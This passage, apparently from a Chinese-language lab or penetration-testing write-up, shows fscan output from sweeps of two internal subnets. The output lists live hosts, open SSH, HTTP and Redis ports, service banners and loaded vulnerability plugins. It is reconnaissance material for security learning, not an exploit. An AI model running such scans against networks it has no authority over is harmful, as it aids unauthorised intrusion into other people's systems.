</span></span><span class="line"><span class="cl">      <span class="n">Fscan</span> <span class="n">Version</span><span class="p">:</span> <span class="mf">2.0.0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">54</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">暴力破解线程数</span><span class="p">:</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">54</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">开始信息扫描</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">54</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">CIDR范围</span><span class="p">:</span> <span class="mf">172.20.0.0</span><span class="o">-</span><span class="mf">172.20.0.255</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">54</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">生成IP范围</span><span class="p">:</span> <span class="mf">172.20.0.0</span><span class="o">.%</span><span class="err">!</span><span class="n">d</span><span class="p">(</span><span class="n">string</span><span class="o">=</span><span class="mf">172.20.0.255</span><span class="p">)</span> <span class="o">-</span> <span class="o">%</span><span class="err">!</span><span class="n">s</span><span class="p">(</span><span class="n">MISSING</span><span class="p">)</span><span class="o">.%</span><span class="err">!</span><span class="n">d</span><span class="p">(</span><span class="n">MISSING</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">54</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">解析CIDR</span> <span class="mf">172.20.0.20</span><span class="o">/</span><span class="mi">24</span> <span class="o">-&gt;</span> <span class="n">IP范围</span> <span class="mf">172.20.0.0</span><span class="o">-</span><span class="mf">172.20.0.255</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">54</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">最终有效主机数量</span><span class="p">:</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">54</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">开始主机扫描</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">54</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">目标</span> <span class="mf">172.20.0.1</span>      <span class="n">存活</span> <span class="p">(</span><span class="n">ICMP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">54</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">目标</span> <span class="mf">172.20.0.10</span>     <span class="n">存活</span> <span class="p">(</span><span class="n">ICMP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">54</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">目标</span> <span class="mf">172.20.0.20</span>     <span class="n">存活</span> <span class="p">(</span><span class="n">ICMP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">存活主机数量</span><span class="p">:</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">有效端口数量</span><span class="p">:</span> <span class="mi">233</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">端口开放</span> <span class="mf">172.20.0.1</span><span class="p">:</span><span class="mi">22</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">端口开放</span> <span class="mf">172.20.0.10</span><span class="p">:</span><span class="mi">3000</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">端口开放</span> <span class="mf">172.20.0.1</span><span class="p">:</span><span class="mi">3000</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">服务识别</span> <span class="mf">172.20.0.1</span><span class="p">:</span><span class="mi">22</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="n">ssh</span><span class="p">]</span> <span class="n">版本</span><span class="p">:</span><span class="mf">9.2</span><span class="n">p1</span> <span class="n">Debian</span> <span class="mi">2</span><span class="o">+</span><span class="n">deb12u7</span> <span class="n">产品</span><span class="p">:</span><span class="n">OpenSSH</span> <span class="n">系统</span><span class="p">:</span><span class="n">Linux</span> <span class="n">信息</span><span class="p">:</span><span class="n">protocol</span> <span class="mf">2.0</span> <span class="n">Banner</span><span class="p">:[</span><span class="n">SSH</span><span class="o">-</span><span class="mf">2.0</span><span class="o">-</span><span class="n">OpenSSH_9</span><span class="mf">.2</span><span class="n">p1</span> <span class="n">Debian</span><span class="o">-</span><span class="mi">2</span><span class="o">+</span><span class="n">deb12u7</span><span class="o">.</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">07</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">服务识别</span> <span class="mf">172.20.0.10</span><span class="p">:</span><span class="mi">3000</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="n">http</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">07</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">服务识别</span> <span class="mf">172.20.0.1</span><span class="p">:</span><span class="mi">3000</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="n">http</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">存活端口数量</span><span class="p">:</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">开始漏洞扫描</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">加载的插件</span><span class="p">:</span> <span class="n">ssh</span><span class="p">,</span> <span class="n">webpoc</span><span class="p">,</span> <span class="n">webtitle</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">网站标题</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.20.0.10</span><span class="p">:</span><span class="mi">3000</span>   <span class="n">状态码</span><span class="p">:</span><span class="mi">200</span> <span class="n">长度</span><span class="p">:</span><span class="mi">7801</span>   <span class="n">标题</span><span class="p">:</span><span class="n">智能商城</span> <span class="o">-</span> <span class="n">您的购物天堂</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">网站标题</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.20.0.1</span><span class="p">:</span><span class="mi">3000</span>    <span class="n">状态码</span><span class="p">:</span><span class="mi">200</span> <span class="n">长度</span><span class="p">:</span><span class="mi">7801</span>   <span class="n">标题</span><span class="p">:</span><span class="n">智能商城</span> <span class="o">-</span> <span class="n">您的购物天堂</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">扫描已完成</span><span class="p">:</span> <span class="mi">5</span><span class="o">/</span><span class="mi">5</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>没看到什么特殊的，扫描一下192的段</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">root</span><span class="nd">@ff7bf03fb11e</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="c1"># ./fscan -h 192.168.100.10/24</span>
</span></span><span class="line"><span class="cl"><span class="err">┌──────────────────────────────────────────────┐</span>
</span></span><span class="line"><span class="cl"><span class="err">│</span>    <span class="n">___</span>                              <span class="n">_</span>        <span class="err">│</span>
</span></span><span class="line"><span class="cl"><span class="err">│</span>   <span class="o">/</span> <span class="n">_</span> \     <span class="n">___</span>  <span class="n">___</span> <span class="n">_</span> <span class="n">__</span> <span class="n">__</span> <span class="n">_</span>  <span class="n">___</span><span class="o">|</span> <span class="o">|</span> <span class="n">__</span>    <span class="err">│</span>
</span></span><span class="line"><span class="cl"><span class="err">│</span>  <span class="o">/</span> <span class="o">/</span><span class="n">_</span>\<span class="o">/</span><span class="n">____</span><span class="o">/</span> <span class="n">__</span><span class="o">|/</span> <span class="n">__</span><span class="o">|</span> <span class="s1">&#39;__/ _` |/ __| |/ /    │</span>
</span></span><span class="line"><span class="cl"><span class="err">│</span> <span class="o">/</span> <span class="o">/</span><span class="n">_</span>\\<span class="n">_____</span>\<span class="n">__</span> \ <span class="p">(</span><span class="n">__</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">__</span><span class="o">|</span>   <span class="o">&lt;</span>     <span class="err">│</span>
</span></span><span class="line"><span class="cl"><span class="err">│</span> \<span class="n">____</span><span class="o">/</span>     <span class="o">|</span><span class="n">___</span><span class="o">/</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>\<span class="n">_</span>\    <span class="err">│</span>
</span></span><span class="line"><span class="cl"><span class="err">└──────────────────────────────────────────────┘</span>
</span></span><span class="line"><span class="cl">      <span class="n">Fscan</span> <span class="n">Version</span><span class="p">:</span> <span class="mf">2.0.0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">30</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">暴力破解线程数</span><span class="p">:</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">30</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">开始信息扫描</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">30</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">CIDR范围</span><span class="p">:</span> <span class="mf">192.168.100.0</span><span class="o">-</span><span class="mf">192.168.100.255</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">30</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">生成IP范围</span><span class="p">:</span> <span class="mf">192.168.100.0</span><span class="o">.%</span><span class="err">!</span><span class="n">d</span><span class="p">(</span><span class="n">string</span><span class="o">=</span><span class="mf">192.168.100.255</span><span class="p">)</span> <span class="o">-</span> <span class="o">%</span><span class="err">!</span><span class="n">s</span><span class="p">(</span><span class="n">MISSING</span><span class="p">)</span><span class="o">.%</span><span class="err">!</span><span class="n">d</span><span class="p">(</span><span class="n">MISSING</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">30</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">解析CIDR</span> <span class="mf">192.168.100.10</span><span class="o">/</span><span class="mi">24</span> <span class="o">-&gt;</span> <span class="n">IP范围</span> <span class="mf">192.168.100.0</span><span class="o">-</span><span class="mf">192.168.100.255</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">30</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">最终有效主机数量</span><span class="p">:</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">30</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">开始主机扫描</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">31</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">目标</span> <span class="mf">192.168.100.1</span>   <span class="n">存活</span> <span class="p">(</span><span class="n">ICMP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">31</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">目标</span> <span class="mf">192.168.100.10</span>  <span class="n">存活</span> <span class="p">(</span><span class="n">ICMP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">31</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">目标</span> <span class="mf">192.168.100.20</span>  <span class="n">存活</span> <span class="p">(</span><span class="n">ICMP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">31</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">目标</span> <span class="mf">192.168.100.30</span>  <span class="n">存活</span> <span class="p">(</span><span class="n">ICMP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">31</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">目标</span> <span class="mf">192.168.100.40</span>  <span class="n">存活</span> <span class="p">(</span><span class="n">ICMP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">存活主机数量</span><span class="p">:</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">有效端口数量</span><span class="p">:</span> <span class="mi">233</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">端口开放</span> <span class="mf">192.168.100.1</span><span class="p">:</span><span class="mi">22</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">端口开放</span> <span class="mf">192.168.100.20</span><span class="p">:</span><span class="mi">6379</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">端口开放</span> <span class="mf">192.168.100.40</span><span class="p">:</span><span class="mi">8080</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">端口开放</span> <span class="mf">192.168.100.30</span><span class="p">:</span><span class="mi">8080</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">端口开放</span> <span class="mf">192.168.100.1</span><span class="p">:</span><span class="mi">3000</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">服务识别</span> <span class="mf">192.168.100.1</span><span class="p">:</span><span class="mi">22</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="n">ssh</span><span class="p">]</span> <span class="n">版本</span><span class="p">:</span><span class="mf">9.2</span><span class="n">p1</span> <span class="n">Debian</span> <span class="mi">2</span><span class="o">+</span><span class="n">deb12u7</span> <span class="n">产品</span><span class="p">:</span><span class="n">OpenSSH</span> <span class="n">系统</span><span class="p">:</span><span class="n">Linux</span> <span class="n">信息</span><span class="p">:</span><span class="n">protocol</span> <span class="mf">2.0</span> <span class="n">Banner</span><span class="p">:[</span><span class="n">SSH</span><span class="o">-</span><span class="mf">2.0</span><span class="o">-</span><span class="n">OpenSSH_9</span><span class="mf">.2</span><span class="n">p1</span> <span class="n">Debian</span><span class="o">-</span><span class="mi">2</span><span class="o">+</span><span class="n">deb12u7</span><span class="o">.</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">服务识别</span> <span class="mf">192.168.100.20</span><span class="p">:</span><span class="mi">6379</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="n">redis</span><span class="p">]</span> <span class="n">版本</span><span class="p">:</span><span class="mf">7.4.5</span> <span class="n">产品</span><span class="p">:</span><span class="n">Redis</span> <span class="n">key</span><span class="o">-</span><span class="n">value</span> <span class="n">store</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">服务识别</span> <span class="mf">192.168.100.40</span><span class="p">:</span><span class="mi">8080</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="n">http</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">服务识别</span> <span class="mf">192.168.100.30</span><span class="p">:</span><span class="mi">8080</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="n">http</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">服务识别</span> <span class="mf">192.168.100.1</span><span class="p">:</span><span class="mi">3000</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="n">http</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">存活端口数量</span><span class="p">:</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">开始漏洞扫描</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">加载的插件</span><span class="p">:</span> <span class="n">redis</span><span class="p">,</span> <span class="n">ssh</span><span class="p">,</span> <span class="n">webpoc</span><span class="p">,</span> <span class="n">webtitle</span>
